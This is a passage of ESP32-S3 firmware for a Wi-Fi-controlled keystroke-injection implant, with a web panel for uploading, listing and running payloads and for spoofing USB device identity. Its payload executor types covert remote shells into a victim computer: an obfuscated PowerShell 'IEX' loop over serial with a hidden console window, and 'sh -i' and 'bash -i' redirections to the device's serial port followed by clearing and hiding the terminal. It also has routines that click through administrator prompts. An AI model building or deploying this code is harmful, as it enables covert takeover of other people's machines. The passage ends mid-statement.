fsUploadFile = LittleFS.open(fileName, \"w\");\n    if (!fsUploadFile) {\n      controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Cannot create file\\\"}\");\n      return;\n    }\n  } else if (upload.status == UPLOAD_FILE_WRITE) {\n    totalUploaded += upload.currentSize;\n    if (totalUploaded > MAX_FILE_SIZE) {\n      fsUploadFile.close();\n      LittleFS.remove(fsUploadFile.name());\n      // Remove meta file using proper string concatenation\n      String metaPath = fsUploadFile.name();\n      metaPath += \".meta\";\n      LittleFS.remove(metaPath);\n      controlserver.send(413, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"File exceeded size limit\\\"}\");\n      return;\n    }\n\n    if (fsUploadFile) {\n      fsUploadFile.write(upload.buf, upload.currentSize);\n    }\n  } else if (upload.status == UPLOAD_FILE_END) {\n    if (fsUploadFile) {\n      fsUploadFile.close();\n      savePayloadMetadata(fileName, payloadName, payloadDescription, payloadOS);\n    }\n  } else {\n    if (fsUploadFile) {\n      fsUploadFile.close();\n      LittleFS.remove(fsUploadFile.name());\n      // Remove meta file using proper string concatenation\n      String metaPath = fsUploadFile.name();\n      metaPath += \".meta\";\n      LittleFS.remove(metaPath);\n    }\n    controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Upload failed\\\"}\");\n  }\n}\n\nvoid listDir(fs::FS &fs, const char *dirname, uint8_t levels) {\n  FileList = StaticListPayloads;\n\n  File root = fs.open(dirname);\n  if (!root || !root.isDirectory()) {\n    FileList += \"<br>Empty<br></body></html>\";\n    return;\n  }\n\n  File file = root.openNextFile();\n  while (file) {\n    String fileName = \"/payloads/\";\n    fileName += file.name();\n\n    // Skip metadata files\n    if (fileName.endsWith(\".meta\")) {\n      file = root.openNextFile();\n      continue;\n    }\n\n    String payloadName = readPayloadMetadata(fileName, META_NAME);\n    String osType = readPayloadMetadata(fileName, META_OS);\n    String payloadDesc = readPayloadMetadata(fileName, META_DESCRIPTION);\n    \n    // Truncate description to first two lines or 120 characters\n    int newlinePos = payloadDesc.indexOf('\\n');\n    if (newlinePos != -1) {\n      int secondNewline = payloadDesc.indexOf('\\n', newlinePos + 1);\n      if (secondNewline != -1) {\n        payloadDesc = payloadDesc.substring(0, secondNewline) + \"...\";\n      }\n    } else if (payloadDesc.length() > 120) {\n      payloadDesc = payloadDesc.substring(0, 120) + \"...\";\n    }\n\n    FileList += \"<div class='payload-item' data-os='\" + osType + \"'>\";\n    FileList += \"<a class=\\\"pyaloadButton\\\" href=\\\"/showpayload?payload=\" + fileName + \"\\\">\" + payloadName + \"</a>\";\n    FileList += \"<div class='payload-desc'>\" + payloadDesc + \"</div>\";\n    FileList += \"<div class='payload-filename'>\" + String(file.name()) + \" - OS Type: \"+ osType +\"</div>\";\n    FileList += \"</div>\";\n\n    file = root.openNextFile();\n  }\n  FileList += \"</body></html>\";\n}\n\nvoid handleStats() {\n  String json = \"{\";\n  json += \"\\\"uptime\\\":\" + String(millis() / 1000);\n  json += \",\\\"cpu0\\\":\" + String(getCpuFrequencyMhz());\n  json += \",\\\"cpu1\\\":\" + String(getXtalFrequencyMhz());\n  json += \",\\\"temperature\\\":\" + String(temperatureRead());\n  json += \",\\\"freespiffs\\\":\" + String(LittleFS.totalBytes() - LittleFS.usedBytes());\n  json += \",\\\"totalram\\\":\" + String(ESP.getHeapSize());\n  json += \",\\\"freeram\\\":\" + String(ESP.getFreeHeap());\n  json += \",\\\"os\\\":\\\"\" + os + \"\\\"\";\n  json += \",\\\"ssid\\\":\\\"\" + WiFi.SSID() + \"\\\"\";\n  json += \",\\\"ipaddress\\\":\\\"\" + WiFi.localIP().toString() + \"\\\"\";\n  json += \"}\";\n  controlserver.send(200, \"application/json\", json);\n}\n\nvoid connectToWiFi() {\n  // Disconnect first if currently connected\n  if (WiFi.status() == WL_CONNECTED) {\n    WiFi.disconnect();\n    delay(1000);\n  }\n\n  bool hasPrimaryConfig = LittleFS.exists(\"/wifi_config.txt\");\n  bool hasBackupConfig = LittleFS.exists(\"/wifi_backup_config.txt\");\n\n  // Try primary WiFi if it exists\n  if (hasPrimaryConfig) {\n    File configFile = LittleFS.open(\"/wifi_config.txt\", FILE_READ);\n    if (configFile) {\n      String primarySSID = configFile.readStringUntil('\\n');\n      primarySSID.trim();\n      String primaryPassword = configFile.readStringUntil('\\n');\n      primaryPassword.trim();\n      configFile.close();\n\n      WiFi.begin(primarySSID.c_str(), primaryPassword.c_str());\n\n      unsigned long startAttemptTime = millis();\n      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {\n        delay(500);\n      }\n\n      if (WiFi.status() == WL_CONNECTED) {\n        initMDNS();\n        return;\n      }\n    }\n  }\n\n  // Try backup WiFi if it exists and primary failed\n  if (hasBackupConfig) {\n    File backupFile = LittleFS.open(\"/wifi_backup_config.txt\", FILE_READ);\n    if (backupFile) {\n      String backupSSID = backupFile.readStringUntil('\\n');\n      backupSSID.trim();\n      String backupPassword = backupFile.readStringUntil('\\n');\n      backupPassword.trim();\n      backupFile.close();\n\n      WiFi.begin(backupSSID.c_str(), backupPassword.c_str());\n\n      unsigned long startAttemptTime = millis();\n      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {\n        delay(500);\n      }\n\n      if (WiFi.status() == WL_CONNECTED) {\n        initMDNS();\n        return;\n      }\n    }\n  }\n\n  // Fall back to default credentials if no saved configs worked\n  WiFi.begin(ssid.c_str(), password.c_str());\n\n  unsigned long startAttemptTime = millis();\n  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {\n    delay(500);\n  }\n\n  if (WiFi.status() == WL_CONNECTED) {\n    initMDNS();\n  }\n}\n\nvoid initMDNS() {\n  String hostname = \"cable-wind\";\n  if (LittleFS.exists(\"/hostname_config.txt\")) {\n    File hostnameFile = LittleFS.open(\"/hostname_config.txt\", FILE_READ);\n    if (hostnameFile) {\n      hostname = hostnameFile.readStringUntil('\\n');\n      hostname.trim();\n      hostnameFile.close();\n    }\n  }\n\n  MDNS.end();\n  if (!MDNS.begin(hostname.c_str())) {\n    Serial.println(\"Error setting up MDNS responder!\");\n  }\n\n  tcpServer.begin();\n  wifiConnected = true;\n}\n\nvoid handleUpdateHostname() {\n  if (controlserver.hasArg(\"hostname\")) {\n    String newHostname = controlserver.arg(\"hostname\");\n\n    File fsUploadFile = LittleFS.open(\"/hostname_config.txt\", FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"Failed to save hostname\\\"}\");\n      return;\n    }\n\n    fsUploadFile.println(newHostname);\n    fsUploadFile.close();\n    controlserver.send(200, \"application/json\", \"{\\\"success\\\":true,\\\"message\\\":\\\"Hostname updated successfully! Device will restart.\\\"}\");\n    delay(1000);\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"application/json\", \"{\\\"success\\\":false,\\\"message\\\":\\\"No hostname provided\\\"}\");\n  }\n}\n\nvoid handleGetHostname() {\n  String currentHostname = \"cable-wind\";  // default\n\n  if (LittleFS.exists(\"/hostname_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/hostname_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      currentHostname = fsUploadFile.readStringUntil('\\n');\n      currentHostname.trim();\n      fsUploadFile.close();\n    }\n  }\n\n  controlserver.send(200, \"text/plain\", currentHostname);\n}\n\n// Function to parse and set layout from payload content\nvoid setLayoutFromPayload(const String &payloadContent) {\n  int layoutPos = payloadContent.indexOf(\"# Layout: \");\n\n  if (layoutPos != -1) {\n    int start = layoutPos + 10;\n    int end = payloadContent.indexOf('\\n', start);\n    if (end == -1) {\n      end = payloadContent.length();\n    }\n    String tmp_layout = payloadContent.substring(start, end);\n    tmp_layout.trim();\n\n    if (layoutMapInit.find(tmp_layout) != layoutMapInit.end()) {\n      selected_layout = layoutMapInit[tmp_layout];\n      Keyboard.setLayout(selected_layout);\n      return;  // Exit after setting layout from payload\n    }\n  }\n\n  // Fallback to saved layout if no layout specified in payload\n  if (LittleFS.exists(\"/layout_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      String layoutKey = fsUploadFile.readStringUntil('\\n');\n      layoutKey.trim();\n      fsUploadFile.close();\n\n      auto it = layoutMapInit.find(layoutKey);\n      if (it != layoutMapInit.end()) {\n        selected_layout = it->second;\n        Keyboard.setLayout(selected_layout);\n      }\n    }\n  }\n}\n\n// Function to get the currently selected layout\nString getCurrentLayout() {\n  String currentLayout = \"en_us\";  // Default to EN_US\n\n  if (LittleFS.exists(\"/layout_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      currentLayout = fsUploadFile.readStringUntil('\\n');\n      currentLayout.trim();\n      fsUploadFile.close();\n    }\n  }\n\n  return currentLayout;\n}\n\n// Function to save the layout configuration to a file\nvoid saveLayoutConfig(const String &layout) {\n  File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_WRITE);\n  if (!fsUploadFile) {\n    controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n    return;\n  }\n\n  fsUploadFile.println(layout);\n  fsUploadFile.close();\n}\n\nvoid payloadExec() {\n  if (cmd.startsWith(\"RunMac \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 7);\n  }\n\n  else if (cmd.startsWith(\"RunLauncher \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.press(KEY_F2);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 12);\n  }\n\n  else if (cmd.startsWith(\"RunNix \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 7);\n  }\n\n  else if (cmd.startsWith(\"RunWin \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print('r');\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.println(Command + 7);\n  }\n\n  else if (cmd.startsWith(\"ShellWin \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    serverIP = Command + 9;\n\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n\n    delay(3000);\n\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"r\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(200);\n    Keyboard.println(\"powershell\");\n    delay(1000);\n    Keyboard.print(\"Start-Job -ScriptBlock { $a = [System.IO.Ports.SerialPort]::GetPortNames(); $p = New-Object System.IO.Ports.SerialPort $a[$a.Length-1], 115200, None, 8, one; $p.DtrEnable = $true; [array]$mk = \\\"I\\\", \\\"f\\\", \\\"E\\\", \\\"x\\\", \\\"X\\\"; Set-Alias f $($mk | ForEach-Object { if ($_ -cmatch '[A-Z]') { $x += $_ } }; $x); $p.Open(); Start-Sleep -Seconds 2; while ($true) { $c = $p.ReadLine(); if ($c -eq \\\"exit\\\") { break }; $o = f \\\"$c\\\"; $p.WriteLine($o); $p.WriteLine(\\\"END_OF_COMMAND\\\") }; $p.Close() };function Hide-ConsoleWindow() {$ShowWindowAsyncCode='[DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);';$ShowWindowAsync=Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru;$hwnd=(Get-Process -PID $pid).MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}else{$UniqueWindowTitle=New-Guid;$Host.UI.RawUI.WindowTitle=$UniqueWindowTitle;$StringBuilder=New-Object System.Text.StringBuilder 1024;$TerminalProcess=(Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle });$hwnd=$TerminalProcess.MainWindowHandle;if($hwnd -ne [System.IntPtr]::Zero){$ShowWindowAsync::ShowWindowAsync($hwnd,0)}}};Hide-ConsoleWindow\");\n    delay(1000);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"ShellNix \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    serverIP = Command + 9;\n\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n\n    delay(3000);\n\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(500);\n    Keyboard.println(\"sh -i > /dev/serial/by-id/*Espressif_Systems_ESP32S3* 2>&1 < /dev/serial/by-id/*Espressif_Systems_ESP32S3*\");\n  }\n\n  else if (cmd.startsWith(\"ServerConnect \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    // the server IP is extracted from the Command array starting from the 14th index\n    serverIP = Command + 14;\n\n    // connect loop\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n  }\n\n  else if (cmd.startsWith(\"ShellMac \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    serverIP = Command + 9;\n\n    // connect loop\n    if (!clientServer.connect(serverIP, serverPort)) {\n      while (1)\n        ;\n    }\n\n    delay(3000);\n\n    // run spotlight/alfred prompt\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n\n    delay(1000);\n    // type terminal\n    Keyboard.print(\"terminal\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n\n    // open new terminal tab, just in case there is terminal open with some chars - make greenlandi (press optin+t)\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n\n    // compressed payload\n    Keyboard.println(\"sh -c 'D=$(ls -t /dev/cu.usbmodem* 2>/dev/null | head -n1) && exec 196<>$D; bash -i >&$D 0<&196 2>&196' &\");\n\n    // payload keyboard press event cleanup\n    delay(100);\n    Keyboard.releaseAll();\n\n    // hide visible output on terminal\n    Keyboard.println(\"clear\");\n    delay(100);\n    Keyboard.releaseAll();\n\n    // hide terminal (option+h)\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"h\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"ShellMacCleanup\")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n\n    delay(3000);\n\n    // terminal cleanup - close tab\n\n    // run spotlight/alfred prompt\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n\n    delay(1000);\n    // type terminal\n    Keyboard.print(\"terminal\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n\n    // cloease tab - option + w\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"w\");\n    delay(100);\n    Keyboard.releaseAll();\n\n    // enter, in case of alert window\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n\n    // hide terminal (option+h)\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"h\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"AltF2\") {\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.press(KEY_F2);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"CtrlAltT\") {\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_ALT);\n    Keyboard.print(\"t\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"GuiR\") {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"r\");\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"Gui\") {\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"GuiSpace\") {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.press(KEY_SPACE);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd == \"DetectOS\") {\n    onDetectOSRequested();\n  }\n\n  else if (cmd.startsWith(\"PrintLine \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.println(Command + 10);\n  }\n\n  else if (cmd.startsWith(\"WinPrintLine \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    writeLineWindows(Command + 13);\n    delay(10);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"Print \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    Keyboard.print(Command + 6);\n  }\n\n  else if (cmd.startsWith(\"WinPrint \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    writeLineWindows(Command + 9);\n  }\n\n  else if (cmd.startsWith(\"Press \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    tmp_key = Command + 6;\n    char key = tmp_key[0];\n    cmd.remove(0, 6);\n\n    if (keyMap.find(cmd) != keyMap.end()) {\n      uint8_t keyCode = keyMap[cmd];\n      Keyboard.press(keyCode);\n    } else {\n      uint8_t keyCode = (uint8_t)key;\n      Keyboard.press(keyCode);\n    }\n  }\n\n  else if (cmd.startsWith(\"PressRelease \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    tmp_key = Command + 13;\n    char key = tmp_key[0];\n    cmd.remove(0, 13);\n\n    if (keyMap.find(cmd) != keyMap.end()) {\n      uint8_t keyCode = keyMap[cmd];\n      Keyboard.press(keyCode);\n      delay(100);\n      Keyboard.releaseAll();\n    } else {\n      uint8_t keyCode = (uint8_t)key;\n      Keyboard.press(keyCode);\n      delay(100);\n      Keyboard.releaseAll();\n    }\n  }\n\n  else if (cmd.startsWith(\"Release\")) {\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"Delay \")) {\n    cmd.toCharArray(Command, cmd.length() + 1);\n    delay(atoi(Command + 6));\n  }\n\n  else if (cmd.startsWith(\"RunPowershellAdmin\")) {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"x\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.print(\"a\");\n    delay(3000);\n    Keyboard.press(KEY_LEFT_ARROW);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(100);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n\n  else if (cmd.startsWith(\"RunCmdAdmin\")) {\n    Keyboard.press(KEY_LEFT_GUI);\n    Keyboard.print(\"r\");\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.print(\"cmd\");\n    delay(2000);\n    Keyboard.press(KEY_LEFT_CTRL);\n    Keyboard.press(KEY_LEFT_SHIFT);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(2000);\n    Keyboard.press(KEY_LEFT_ARROW);\n    delay(100);\n    Keyboard.releaseAll();\n    delay(100);\n    Keyboard.press(KEY_RETURN);\n    delay(100);\n    Keyboard.releaseAll();\n  }\n}\n\nvoid handleUpdateWiFi() {\n  if (controlserver.hasArg(\"ssid\") && controlserver.hasArg(\"password\")) {\n    String newSSID = controlserver.arg(\"ssid\");\n    String newPassword = controlserver.arg(\"password\");\n\n    File fsUploadFile = LittleFS.open(\"/wifi_config.txt\", FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to open file for writing\\\"}\");\n      return;\n    }\n\n    fsUploadFile.println(newSSID);\n    fsUploadFile.println(newPassword);\n    fsUploadFile.close();\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Wi-Fi config applied successfully! Device will restart.\\\"}\");\n    delay(1000);  // Give time for response to be sent\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Missing SSID or password\\\"}\");\n  }\n}\n\nvoid handleUpdateBackupWiFi() {\n  if (controlserver.hasArg(\"ssid\") && controlserver.hasArg(\"password\")) {\n    String ssid = controlserver.arg(\"ssid\");\n    String password = controlserver.arg(\"password\");\n    File file = LittleFS.open(\"/wifi_backup_config.txt\", FILE_WRITE);\n    if (!file) {\n      controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to save backup Wi-Fi config\\\"}\");\n      return;\n    }\n    file.println(ssid);\n    file.println(password);\n    file.close();\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Backup Wi-Fi config saved. Device will restart.\\\"}\");\n    delay(1000);\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Missing SSID or password\\\"}\");\n  }\n}\n\nvoid handleDeleteWiFiConfig() {\n  if (LittleFS.remove(\"/wifi_config.txt\")) {\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Wi-Fi config deleted successfully\\\"}\");\n    connectToWiFi();\n  } else {\n    controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to delete the file\\\"}\");\n  }\n}\n\nvoid handleDeleteBackupWiFiConfig() {\n  if (LittleFS.remove(\"/wifi_backup_config.txt\")) {\n    controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"Backup Wi-Fi config deleted successfully\\\"}\");\n    if (WiFi.status() != WL_CONNECTED) {\n      connectToWiFi();\n    }\n  } else {\n    controlserver.send(500, \"application/json\", \"{\\\"status\\\":\\\"error\\\",\\\"message\\\":\\\"Failed to delete backup Wi-Fi config\\\"}\");\n  }\n}\n\nvoid handleUpdateUSB() {\n  if (controlserver.hasArg(\"vendorID\") && controlserver.hasArg(\"productID\") && controlserver.hasArg(\"productName\") && controlserver.hasArg(\"manufacturerName\")) {\n\n    String vendorID = controlserver.arg(\"vendorID\");\n    String productID = controlserver.arg(\"productID\");\n    String productName = controlserver.arg(\"productName\");\n    String manufacturerName = controlserver.arg(\"manufacturerName\");\n\n    File fsUploadFile = LittleFS.open(\"/usb_config.txt\", FILE_WRITE);\n    if (!fsUploadFile) {\n      controlserver.send(500, \"text/plain\", \"Failed to open file for writing\");\n      return;\n    }\n\n    fsUploadFile.println(vendorID);\n    fsUploadFile.println(productID);\n    fsUploadFile.println(productName);\n    fsUploadFile.println(manufacturerName);\n    fsUploadFile.close();\n    controlserver.send(200, \"text/plain\", \"USB config applied successfully! The device will restart.\");\n    ESP.restart();\n  } else {\n    controlserver.send(400, \"text/plain\", \"Missing USB configuration data\");\n  }\n}\n\nvoid handleDeleteUSBConfig() {\n  if (LittleFS.exists(\"/usb_config.txt\")) {\n    if (LittleFS.remove(\"/usb_config.txt\")) {\n      controlserver.send(200, \"text/plain\", \"USB config deleted successfully\");\n      ESP.restart();\n    } else {\n      controlserver.send(500, \"text/plain\", \"Failed to delete USB config file\");\n    }\n  } else {\n    controlserver.send(500, \"text/plain\", \"USB config file does not exist\");\n  }\n}\n\nvoid handleLayout() {\n  if (controlserver.hasArg(\"layout\")) {\n    String layout = controlserver.arg(\"layout\");\n    auto it = layoutMapInit.find(layout);\n\n    if (it != layoutMapInit.end()) {\n      Keyboard.setLayout(it->second);\n      saveLayoutConfig(layout);  // Save the layout selection\n      controlserver.send(200, \"text/plain\", \"Layout applied successfully!\");\n    } else {\n      controlserver.send(400, \"text/plain\", \"Invalid layout specified.\");\n    }\n  } else {\n    controlserver.send(400, \"text/plain\", \"No layout specified.\");\n  }\n}\n\nvoid handleGetCurrentLayout() {\n  String currentLayout = getCurrentLayout();\n  controlserver.send(200, \"text/plain\", currentLayout);\n}\n\nvoid handleDeletePayload() {\n  if (controlserver.hasArg(\"configmodule\")) {\n    String filenameToDelete = controlserver.arg(\"configmodule\");\n    if (filenameToDelete.length() > 0) {\n      deleteFile(LittleFS, filenameToDelete);\n    } else {\n      controlserver.send(400, \"text/plain\", \"File name is empty\");\n    }\n  } else {\n    controlserver.send(400, \"text/plain\", \"Missing file name\");\n  }\n}\n\nvoid setup() {\n  USB.onEvent(usbEventCallback);\n  Keyboard.onEvent(usbEventCallback);\n  USBSerial.onEvent(usbEventCallback);\n\n  if (!LittleFS.begin(true)) {\n    // format in case of missing file system\n    LittleFS.format();\n    delay(1000);\n    ESP.restart();\n  }\n\n  if (LittleFS.exists(\"/usb_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/usb_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      String vendorID = fsUploadFile.readStringUntil('\\n');\n      vendorID.trim();\n      String productID = fsUploadFile.readStringUntil('\\n');\n      productID.trim();\n      String productName = fsUploadFile.readStringUntil('\\n');\n      productName.trim();\n      String manufacturerName = fsUploadFile.readStringUntil('\\n');\n      manufacturerName.trim();\n      fsUploadFile.close();\n      USB.VID(strtol(vendorID.c_str(), nullptr, 16));\n      USB.PID(strtol(productID.c_str(), nullptr, 16));\n      USB.manufacturerName(manufacturerName.c_str());\n      USB.productName(productName.c_str());\n    }\n  }\n\n  USB.begin();\n  Keyboard.begin();\n  USBSerial.begin();\n\n  if (LittleFS.exists(\"/layout_config.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/layout_config.txt\", FILE_READ);\n    if (fsUploadFile) {\n      String layoutKey = fsUploadFile.readStringUntil('\\n');\n      layoutKey.trim();\n      fsUploadFile.close();\n      auto it = layoutMapInit.find(layoutKey);\n      if (it != layoutMapInit.end()) {\n        selected_layout = it->second;\n      }\n    }\n  }\n  Keyboard.setLayout(selected_layout);\n\n  if (LittleFS.exists(\"/payloads/payload-startup.txt\")) {\n    File fsUploadFile = LittleFS.open(\"/payloads/payload-startup.txt\", FILE_READ);\n    if (fsUploadFile) {\n      livepayload = fsUploadFile.readString();\n      // Set layout based on payload content\n      setLayoutFromPayload(livepayload);\n      payload_state = 1;\n      payloadExecuted = false;\n    }\n  }\n\n  connectToWiFi();\n\n  {\n    File root = LittleFS.open(\"/payloads/\");\n    if (root && root.isDirectory()) {\n      File file = root.openNextFile();\n      while (file) {\n        String fileName = file.name();\n        size_t fileSize = file.size();\n        file = root.openNextFile();\n      }\n    }\n  }\n\n  delay(3000);\n\n  controlserver.on(\"/\", []() {\n    controlserver.send_P(200, \"text/html\", Index);\n  });\n\n  controlserver.on(\"/stats\", handleStats);\n\n  controlserver.on(\"/connectioncheck\", []() {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"ok\\\"}\");\n  });\n\n  controlserver.on(\"/livepayload\", []() {\n    controlserver.send_P(200, \"text/html\", LivePayload);\n  });\n\n  controlserver.on(\"/uploadpayload\", []() {\n    controlserver.send_P(200, \"text/html\", UploadPayload);\n  });\n\n  controlserver.on(\"/config\", []() {\n    controlserver.send_P(200, \"text/html\", Configuration);\n  });\n\n  controlserver.on(\n    \"/upload\", HTTP_POST, []() {\n      controlserver.send(200, \"application/json\", \"{\\\"status\\\":\\\"success\\\",\\\"message\\\":\\\"File uploaded successfully\\\"}\");\n    },\n    handleFileUpload);\n\n  controlserver.on(\"/listpayloads\", []() {\n    listDir(LittleFS, \"/payloads\", 0);\n    controlserver.send(200, \"text/html\", FileList);\n  });\n\n  controlserver.on(\"/showpayload\", []() {\n    String fileName = controlserver.arg(\"payload\");\n    readFile(LittleFS, fileName);\n    controlserver.send(200, \"text/html\", FileList);\n  });\n\n  controlserver.on(\"/style.css\", []() {\n    // Set aggressive caching for CSS\n    controlserver.sendHeader(\"Cache-Control\", \"public, max-age=1728000\");   // Cache for 20 days\n    controlserver.sendHeader(\"ETag\", \"\\\"v1.0\\\"\");                           // Add ETag for cache validation\n    controlserver.send_P(200, \"text/css\", Style);\n  });\n\n  controlserver.on(\"/javascript.js\", []() {\n    // Set aggressive caching for JavaScript\n    controlserver.sendHeader(\"Cache-Control\", \"public, max-age=1728000\");  // Cache for 20 days\n    controlserver.sendHeader(\"ETag\", \"\\\"v1.0\\\"\");                           // Add ETag for cache validation\n    controlserver.send_P(200, \"application/javascript\", Redirect);\n  });\n\n  controlserver.on(\"/reboot\", HTTP_POST, []() {\n      // Send response first\n      controlserver.send(200, \"application/json\", \"{\\\"success\\\":true,\\\"message\\\":\\\"Device rebooting\\\"}\");\n      \n      // Delay to ensure response is sent\n      controlserver.client().setNoDelay(true);\n      delay(100);\n      controlserver.client().stop();\n      delay(100);\n      \n      // Then reboot\n      ESP.restart();\n  });\n\n  controlserver.on(\"/dopayload\", []() {\n    if (livepayload != \"\") {\n      payload_state = 1;\n      payloadExecuted = false;\n    }\n    controlserver.send(200, \"text/plain\", \"Payload running...\");\n  });\n\n  controlserver.on(\"/runlivepayload\", []() {\n    livepayload = controlserver.arg(\"livepayload\");\n    if 